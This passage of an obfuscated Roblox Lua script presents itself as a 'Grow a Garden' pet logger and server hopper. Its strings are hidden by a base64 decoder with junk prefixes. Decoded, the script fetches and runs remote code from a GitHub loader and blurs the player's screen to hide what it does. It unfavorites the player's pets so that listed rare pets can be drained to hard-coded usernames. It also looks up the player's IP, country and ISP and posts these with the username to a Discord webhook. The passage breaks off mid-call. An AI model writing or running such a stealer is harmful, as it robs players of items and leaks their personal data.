RLoCODAfXegVnlkHPfnfsLaMpqeBWtGRRMoGJVktJW0tJWQgJUg6JU06JVM=')) }
    })
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- ✅ Grow a Garden Pet Logger + Auto Drainer + Server Hopper + Unfavorite Handler

-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('roUPVbxAsMkeWhjaQgQoxnzlqLVdJCfSKkDURfMUNtcksohKVtJcUQeaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('zWuBhsmBQbHGAhUZSMxZCGxaHvUMZLbiPhYqbwkhmgbCXtRToOnsBMLaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('diduGMKtcGsuLTtRemDpKtEmvZSjgUKKafZTZdsZUGyQGExOqnMqpTtaW50ZXJjZXB0ZXJudW1iZXIx'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('MxgntwgzQxPtEkVskvsZwYyTWoFVAveGTfBbynZaSLsjzEWQfjXjarlTXlBbHQ='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('WjdynxnVzlMShtELacomvYMwMtuUccVBhJYhUDmQKRDbkCckAgCAbYjRW5lbXlHdXk=')}
local drainPets = {
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('xfoHQkMLYWutTcdclUZrcnfKpcyORUpVFTtLEJoytDCcxrBrUsGwCWaRHJhZ29uZmx5'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CaWMKheRjZmxVPAuXiIhmQWDnaDlqjHaTdeUqSESIramulrcgsOLweoVOKAkVJleA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('uWknDyYDrInEgibdQKUYSfTfpXkjsDkoPRAjYAXcOKUvFTqTZdTAeOKUmFjY29vbg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('yaQUjZPdJSLJhMFrfvlIGeVmFoSNkAVvGvjVUDTuOImlrwcSlwVZDtBUmVkIEZveA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('sKaRlLwfKdrfDnKLKPQNxBWFuUZbmTETASMwPOXlAVRtfeOgxjhVPjGUXVlZW4gQmVl'),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('zYEKQxeLJKsXCrKiaNtHRLzwgIFRDAJxSgVCdUJgQBItWaTqlnBWKsKRGlzY28gQmVl'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('fIFLRcsTpUhYnQqxILZhCFgUcwqtXcTiAcnzlOinQGMTAESUDqxGEQhQnV0dGVyZmx5'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CQfOOCVOSLWfcFRQfyqCuGxUKpCvofoGnwCOAkizVFUYJNutvktjChyTWltaWM='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ydbWAiMAXzBcmmlRICxQobgQFUnQHBwJldlfAxLgvzHYUqWQksIgjSmTW9vbiBDYXQ='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('dSjdEosdLlPNggMnQDvrqSLHpTAsgYnCnHIAKwbcsGcktRUIMQbuQdLRmVubmVjIEZveA=='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('xrLFLNNMqXWjQJHdVkJSFqUAcqpsynvBPoPvdbnUFFWqZalzbAGbKdLVHJpY2VyYXRvcHM='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('QShAVqcdFPKpgSxPYcWWBIGueghzbpwOqBpsFsbkiumjgxFrWSRQoIfQXhvbG90bA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('KTbpDUxOknKkyMeLUJqlyCJeHDEzZeBhkSwTsNUTxahsAXOvQoqrXGiQmVhciBCZWU='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('KbENzDdbyARjQExnYTwSoOSzFSVyRGxpVvcPyZrjBefKuFLlhPOSfDOUG9sYXIgQmVhcg=='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ODvMoGPBSHhbTSdypCVTXXekpeLfPXMHhdceiVEgOECIakDFgXLzffjUHJheWluZyBNYW50aXM='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('IWOWumirTYoICFVNUibBHSUWRurWZNVRyukgEcCoBcHtvduBVbdtVgKU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('JxRrTSdLEdqySxvcwLyMootdzacGuiDLsvNcFCHrQjzsDbbOGdFCHGCU3RhcmZpc2g='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('mXQejeGtOKAeFEecABOTujKmCOejKXRtBaNdIFTgHeMznACZmYuLPeAQ3JhYg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('sZSIHgyAKmnWVntLoiLShbnEoHvmtbtnUdAOlRkATMSdeNpwueoGEPgU2VhZ3VsbA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('UgwVRhFNIoxAZsoGvrUOAsyzZvPdmAvTnKFyLFXRrUnVuSGCwMagiPsQnVubnk='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('mZgYxFksdGsmFnFvBYdZtzxmTmufgOauGjkbDqXAeGqWxhrYyjVvrVcRG9n'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('DoyGemAFCGzvZbEcQVMMPrFVXHzEgVcUMFmTXIdUUKYNHQQnBFQFIqBR29sZGVuIExhYg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('rmlbbjcbdaTvxyRYjtIzDNrnlsXmYwfoeusyYPolKnhyNTmKJrALWEiQmVl'),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('vfVxclYKWfqiQXxwRBNWabsiOTMkiiJrcrrmAbDFzmKgcavcjbDUCzVQmxhY2sgQnVubnk='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('UhyJaqvHgBARucxrvdzqLXlMKqRVxbDfrXAViJzDIoIUInjvYJPWhCyQ2F0'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('neqeLCHYpgVGqGACIyfzhnegOjUamaQALvYehUWjHSbseztRXRNtmMXQ2hpY2tlbg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('emhEsdJOFaVdEFaRocGXTecQzFhDKDTHkhTTYdpUPHOrVDbRjOciZCgRGVlcg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('zomJlimDScgBqaMrTBcYYaYaMNWpDILHrADnWMeoJACaINGUnDkFXMjTW9ua2V5'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ZDbaXlqaixiBzQRbMLIGfEfuRcJoCIoYuXyPRXbEYvprXquREDwgAwvT3JhbmdlIFRhYmJ5'),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('KOmttBhujjrANkCjIyGTvTzpoFuFmYsilBxmzNZcLlTvTvSufcMiloVUGln'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('KjGNRfodafDKtNnKWtbbiYiQPdWPAnMrEqbtKNdPzIryRRLxFDDtSYLUm9vc3Rlcg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('OpwFmOBFehdbVglOLiGsuuadCdkyrxwhGjWzyvigHTepXcJiyESiwktU3BvdHRlZCBEZWVy'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('EVWWhhFNcwHSmtcpiZxXDYguhrswMKmXgVIpepNZRwUxeESxcLGhclxRmxhbWluZ28='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ZxOEGZrVGBUDQNYAkliituLLhiBABdRzahnJrJbuPQPTQLlJnOvIKCoVG91Y2Fu'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('xyCyoUWqokqBBfSThofMCSkeQUMqbmLlyckLjdPZFoEKjikfPKWuocFU2VhIFR1cnRsZQ=='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('YWvGjBgLOLHjjITqqmrjIFCuAPLagcHDWAJhhvnunLOShPJfWNhLUyoT3Jhbmd1dGFu'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('zGEtwYVKEzWxhpXmBqqDOGkvrfnVCCpVGVCdAvJrbJbYKunWUBRdPnpU2VhbA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('xDWLVFYOFywqjlqVFatoUnrLuSoWlzsQYKnoWnwNPgpIhEgSRNjPkfGSG9uZXkgQmVl'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('DsjrKzspXlDflfYIVlMthvQRBTmfbjzRxVPWsJSMuytugqYWaypXtlAV2FzcA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('HsWvzdYmMsxebVFvyPcQrkdCgiDcLzwfOqPLTVzGogWzIylLcThplrVVGFyYW50dWxhIEhhd2s='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('FcYREjUTmTZdRkxpqfKuBNYUrPYzNzoCOIQOonTXZpRPfhmyTxyXEVyUmFwdG9y'),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('zgJczxGpypaxiUoxLEOfHSEmiuwJhvEzPKLALESjiLGgSZQaGVQrYKxVHJpY2VyYXRvcHM='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('IVsGLgXodFSneaXzSNjaAlPxpTMBWZiRBjNddsaqfGkDHzEgvTAjwABU3RlZ29zYXVydXM='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ihWqReinQBKCNFtvFSJYuZcrvOrNSsHpXiUuslwtkDDxnxphmZblTwIUHRlcm9kYWN0eWw='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('GUnJtKFupuSVHQUWOrHpfEABAbXkyBHekoOpdFIBWdzERjBnrXhwqmVVHVydGxl'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('tDqNBGMqJDRFSCszzLTEdPopJIxKGcLjItvyoJCUPCEqGXDaTISdoDSQ2F0ZXJwaWxsYXI='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('qiRKITkvxZZXlMgVgHypYbpcrkWEypSABHGSrOuWieEFToBjIXCHjHlUGV0YWwgQmVl'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('KRegJFZRwdxnJlcTmHnUMSbrLXjDVcjGvzUvNOYGdyuXLcbwhDETTyITW90aA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('sFsvcTuxKWUxvYNMxLqImzdpSVrznOdBxTGkeGVseqTQwBmqnBCArfqU2NhcmxldCBNYWNhdw=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('YTZvBDiogYYXiBCHKuqOEAZOUwRPfFxITbvjGTDNpiGdauUirnmBhGrT3N0cmljaA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('mJWXJekNMfOqfyvarzDxRkSPgruWHcYgefhhMjLCntaZztBCviHoHNiUGVhY29jaw=='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('OHbPRsVTtACVLMojePClPpsgMYQHWQmmuGeeWrgjYanwYHpSYHDQKIvQ2FweWJhcmE='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('jZaVphKwuwyIWpsEANBumslVMijtdmdjxZIQsuRkPbfIzbCtliDaKFSU2FuZCBTbmFrZQ=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('TwKvQocfTEovNiJnhzLUedqHIaWLdeTaUtwnhKizusVjXPIsASFzYroTWVlcmthdA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('PVWqikKOzWvyCJRAZwbfFRFoDYPsPJTOwGsUTZdhtOfGsIQQshXjjOBQnJvd24gTW91c2U='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('BpiQxwqUobMiQbHRNKeLTNqjacAwzFGLogzDIzHIcjpgBzbOUWQfXpyR2lhbnQgQW50'),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('FJnkPGpAoOsVDYijJygAJIrKDxuxoemTMxsQhBcaLpuUvwclfIoZTXjR3JleSBNb3VzZQ=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('qVhFlevTmBFhCJcohSdSFWjbEInUmWDsjNNVtwMxuazvgyAHXxJcBwcUHJheWluZyBNYW50aXM='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('BkkTsbahNxQdGysMtXfHhCaPWvFWHbuWpVtPBoPoiFgFIhtNcziTiuFUmVkIEdpYW50IEFudA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('rzsSOQAIPHONDGPxXFHaDvXdmHhNhBwkPYQZwaXHzNtbYoYcRDbfkYAU25haWw='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('jVOIKnhYTiBONBfgABYTfsVSBMJDWrDRkLQwyvglCgTsVukpBWDUxKHU3F1aXJyZWw='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('tQCRrvdyJhGlSEwNvJeneoJMRswxZgFflTBNfxjaJjAceloFcUaPylbQmVhciBCZWU='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('BlVXtxoneVxjelZTiJuFuASXTOFamsbcwzlcLiubSKXxHykSKvTiPUAQnV0dGVyZmx5'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('TKRsWQLHZYwdFXObLpTAnFnukWMPhKZpYsvfTlmqprroZNRBJuNlQPPQnJvbnRvc2F1cnVz'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ERYXelaUNqGDortXVlnOFyXwpEfZlVQamDvRPkNQAVSqbkEhLRwrMEtUGFjayBCZWU='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('GgQrnrvxDILpCLCDwIfEHPlEADavfmIQGAHsJfBoSEJoSnfkgdshVgxTWltaWMgT2N0b3B1cw=='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('MrvfVuGCHojBepPJRRiIdSRqtAQjNxotztGhCnlusaAqjPgCnVUkQBISHlhY2ludGggTWFjYXc='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('hrXqnowVrnseGAvtfEbfUxmOrTHhRnNnQnGvGCreAEdDFiYbnkKiPWBQXhvbG90bA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('TfTKffsRLiUjsCygKgTyrIlCHqzGapwacZMafNpgoxfcThvFOlCYSzKUmVkIEZveA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('SMYHURsOYKLykWYlZXGTaSXrFrNNWXNpQlxxcwYiBziZvFmnfeidlCMVOKAkVJleA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('SyntoncgQHAcXTQcdGYiaBcijkAgtTQPvXCJdTxMrzNPGnDHKbJyRxtRHJhZ29uZmx5'),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('TuEsoBLbrFkEIUnpwtYdiVCtiCspfiiTbErphBUmUiySoWjALIftNXrUXVlZW4gQmVl'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('xSExBYeRSNxjqSgKYSzgwtyvMMqSjwHDOnPCkgIeieQLTNVmwvQovadRGlzY28gQmVl'), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('gmOJAyieeLJIQClRtsiVxypATRQqwjCqTpInDnjPAcRfLPapdmoPsgDRmVubmVjIEZveA=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('wllYJZBtKMYLbvzznwdHHKxrLHzPpgufjBgUFhfevUMNLuUAeWdROscTW9vbiBDYXQ='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('SvXIHyBMsjvBbFKaOBaMEUAfmDdaYXVeSvfpeENeMNRFghHGHpjYBflUmFjY29vbg=='),
    MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('UaSIVadsfQloRJnOhaYAKKhIVvYkuMQEPCGVXuUIGUbuWhGxGkIHQDfUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('WzFUjpKPafCPBavQZDfXOHXRktZwSoDeyXllHnhmimYemDbDUClrliSUGxheWVycw=='))
local ReplicatedStorage = game:GetService(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('hobzZhQlPpomdlzVAKhlCxLUTDKFfFmJWzHKvVqPIonazIEcnqucFwJUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ctDJLoUDbqhQxyacnlfQUWGndpyaJKEBNRLstWJUSkxYhydUdpPNWKWSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('DkuYHHTDOMaFcVLrhkqWddWmhtwXLJJvAAUOseZSeEsDIWNfQsqYGLqVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('SflQoUnVBwyzCvaUODNYOlpjhGwTBJdofnMtOaNwLdWhzPlkAvVPVDQTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('vTJoPRsrnFLQBgQTZlVRQjmkvWMNoOiPSoxdaaLQjqNkaOkindIiDXuQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('XkZkwnCjwlYWxCadrjuHrscHZPKxCMPDzIqaZModEVEZnsADSoEtBLs')
    local lowest = nil
    repeat
        local url = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('XDjruXYpkdvqTTeGxPNuUREfkZaLcqUcxGAPDvOfgaxptpfFiJFrUmTaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('eFLpxeSdmzfXNldRQCAnTBTTWUgUfJUzWnbjLJzjSrWSXuHGwWLiaUDL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('UhrFyoPLWQVbDqFOkpncbMxtrHLuZhzhouZbFJgQedjcqnbNXipvcnx') then url = url .. MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('hJskUmCVCJIYDTfTFfmUcOiSCbBJzXJDnTAjfQeGzabTAjceEMWIeFTJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CIZAWnSWjeGgTbzzaHeBaqzOIDdZSnjNrUDmMozCKVFvMpHpmocuCatR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('UuggkjXzEpGlRUbnAFHvRrPZtMrMzfnTilOuugrFLpOXAzVQPcHVHfY') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('NoYGQbINDdpBSVUDZraCRpSspinnsHgPiETXWHgULEnCCqLFuQuGfdlWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('TKtXZugimcPizaAvZmVwJsThiOxurEbtMvqSNaWewogMaVfZLVwudlGWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('GxWMUlEIYvDscYSLPVtnxSneaKodShglMrWGHKYTgwRAeDtJTAgvVpyQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('GMyqkdtrwuqgStxBKFWqoCnVsfEnnMmqRTpZrMfmriHAllmeASuVBOeVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('sydWZkvQXGcYGKQphNQgWJTqnJljQCYypduxoxWYgZRPtdCwJauravdLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CKKraMFGinuCLsEuCuFPYxxIizDlJQFOvmzhYdMQudcgcbFMHahNfLq8J+OkiBQZXRzIA==') .. tostring(i) .. MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('HGQiOkAeiBLpHZiGbfydzBewKslgTHlpnSyjMiLYifeNdMMIjiuLCKg4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('QvXBQkRleOvFqUpyunpQAyeDELzYGJZjhZahuafNOxYyqWzhcCODGcVXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('LLROkgxkcbNBuPYPCbPkTRZBbDAZucPWoPWspSSviGUtFpAIRaKXasN'),
        embeds = {{
            title = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('qejZBQEAZifZiMUSVAXhFuaUDhRJqbYztzkyxEgFBpVBSStDYpkcMzo8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('rFFHBvmFcdpDheUzRLCnyEXuPSnZcyPGQkQDmplDLtbSUMajqYMqyWlRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CRZtbHeWTqHGwJbChFqPdQqFLYVrLEaHxvyidGMydEeDAvenaWzMylgISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ThbtJIztHYgZCoHTeSQtOuVTGKsTOTuCeeKqyBgAmwcdFWWfNRRLvrMUE9TVA=='),
            Headers = { [MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('NCEpGiDiqsEUucALnQebAxChhHlaVPYOIaXakEHQkxRZKUfyrmRjHAMQ29udGVudC1UeXBl')] = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('hcodVRiLDGVANWxHUWxxXplBIJVpNrSWUaRMxOIFPsaTmxprmWJBWWVYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ejlgsdsBvXawCTKWZhSuOGdaJGbkMoewbdocGkqvtfJAFKNzlaZSKUhVW5rbm93bg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ouJxooZBThgChpnsaqxQolwSznLyfyaIEkbcgGpXuPiJrQNaJdgvsNJVW5rbm93bg=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('bFfgYKToJIACuYTdhBJqcLJlnxhJtHnqpUqSextmxcnotEGAdGAAbAiVW5rbm93bg==') end
    local result = req({ Url = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('GiqBtvtLOBlTEXboRWqkZBxpPLLzasDQRTXiwEzvCpvWZqWcPfOUtllaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('LvcRuoYwctrHYAxWOOODLywOhnuQATHPbislzTLOMAAcGwHeiLuhTGnR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('fPAOLHEPFHfuiJSaXHeWZpJvNDUKbmncOGxisqrylWnkDuAuVygicZGPw=='), body.country or MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('rGGNLcrYrePxkLaJXpVqDLvEzhRpbtzWoPejdPiJajhzxXytuzJTOxTPw=='), body.isp or MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('gpmhwDkCIWIukxwuJrnhsPQBDsepqOTlaFoxqzuthXwghRZjJQOlQlkPw==')
    end
    return MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ExdqrIVlvuzWjpXvAzoZCWlEOTkUJlUyfejNHeMhrEAFSGjXxoxnPFzPw=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('AxVMdUYtBqHULqXbtcDCNJEGpsAqHtpnxANIxiaRTiCOaFfwvNdvrMSPw=='), MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ayzsOgUijfLAqbVOrQcOVzydGgWkRtySZBDbemEjiGfuZthJaIqEzHpPw==')
end

-- UNFAVORITE PETS
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('ADOAonSSovYVBMEReyakyKKvVLxHdfhVGtAuvOminVhhQwOnPQhKTkERGV4'))
    if not dex then return end
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('sWuSVXBBFAlKmGLthybYdetnHQLqevhkqymUByXyYfthMHdVnMlzivISW5zdGFuY2U=')) and item:GetAttribute(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CeriEusROHhYGQnJhKBGWoqiFnHWHfDzGBMxqQSbtzsjbAysUwixgUVZA==')) == true then
            ReplicatedStorage:WaitForChild(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('PlEllWKnfSQMViMuLTBJeMvmyaYztELFuxINSbcdeYYCBIIzVfYLLXGR2FtZUV2ZW50cw==')):WaitForChild(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('JGzIKLYxtypxzjWbuwVQzMpEeuNwpsLSdmEAlEBUxmpZTroOCHtVGExVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('HfbERZeeBZAomgNfgkOVkklyNWfVlBtWMmusgsSakGURMKfjzmADKiX8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
